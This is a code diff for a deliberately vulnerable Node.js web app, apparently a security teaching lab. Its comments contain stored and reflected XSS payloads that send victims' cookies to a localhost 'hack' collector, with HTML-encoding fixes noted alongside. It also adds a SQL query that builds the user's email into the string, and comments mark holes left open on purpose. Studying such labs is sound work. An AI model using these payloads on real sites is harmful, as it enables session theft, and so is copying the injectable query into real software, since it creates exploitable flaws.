@@ -4,6 +4,17 @@ const htmlencode = require('htmlencode');
 
 /* Example of stored xss
 <script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;document.write(`<img src="${url}"/>`);</script>
+
+solution: ${htmlencode.htmlEncode(comment)}
+*/
+
+/* Examples of reflected xss
+http://localhost:3000/search_payments?date=%3Cscript%3Evar%20url%20=%20`http://localhost:3001/hack?victimCookie=${document.cookie}`;document.write(`%3Cimg%20src=%22${url}%22/%3E`);%3C/script%3E
+
+With Same Origin Policy Block:
+<script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;fetch(url);</script>
+
+solution: htmlencode.htmlEncode(date)
 */
 
 const { Client } = require('pg')
@@ -37,8 +48,7 @@ const fetchAndRenderCommentsList = async () => {
         
         const selectQuery = `select * from comment`;
         const commentRecords = await client.query(selectQuery);
-            
-        // ${htmlencode.htmlEncode(comment)}
+                    
         let commentItemsHtml = '';
         commentRecords.rows.forEach(({ user_email, user_name, comment }) => {
             commentItemsHtml += `<li style="border:1px solid; margin-bottom:5px; padding: 5px;">
@@ -211,8 +221,8 @@ app.post('/sessions', async (req, res) => {
 
         // TODO protection to destroy previous session. Leave it open as a vulnerability
 
-        // const destroySessionQuery = `DELETE from user_session where user_email='${email}'`;
-        // await client.query(destroySessionQuery);
+        const destroySessionQuery = `DELETE from user_session where user_email='${email}'`;
+        await client.query(destroySessionQuery);
 
         // console.log('Destroy session query: ', destroySessionQuery);
 
@@ -389,7 +399,7 @@ app.get('/search_payments', async (req, res) => {
         </html>`
         
         // TODO to remove, letting an open vulnerability for reflected XSS
-        res.set('X-XSS-Protection', 0);
+        // res.set('X-XSS-Protection', 0);
 
         res.send(htmlResponse)
 
